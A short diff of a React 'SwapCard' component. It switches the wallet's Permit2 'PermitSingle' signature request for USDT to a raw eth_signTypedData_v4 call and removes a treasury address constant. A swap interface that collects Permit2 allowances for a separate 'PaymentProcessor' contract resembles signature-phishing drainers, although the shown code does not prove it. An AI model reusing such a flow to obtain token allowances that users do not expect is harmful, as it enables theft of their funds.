@@ -28,7 +28,6 @@ export default function SwapCard({ walletAddress, provider }) {
 
   // ⭐ ඔයාගේ PaymentProcessor contract address එක
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
-  const TREASURY_ADDRESS = "0xB70a8100a45a28b605dbfb34d713071e21A57D28";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
@@ -168,8 +167,16 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 7. Sign කරන්න
-      const signature = await signer._signTypedData(domain, types, message);
+      // 7. Sign කරන්න (eth_signTypedData_v4 පාවිච්චි කරන්න)
+      const signature = await provider.send('eth_signTypedData_v4', [
+        walletAddress,
+        JSON.stringify({
+          domain,
+          types,
+          primaryType: 'PermitSingle',
+          message
+        })
+      ]);
       
       setStatus({ type: 'info', msg: '⏳ Sending to contract...' });
       
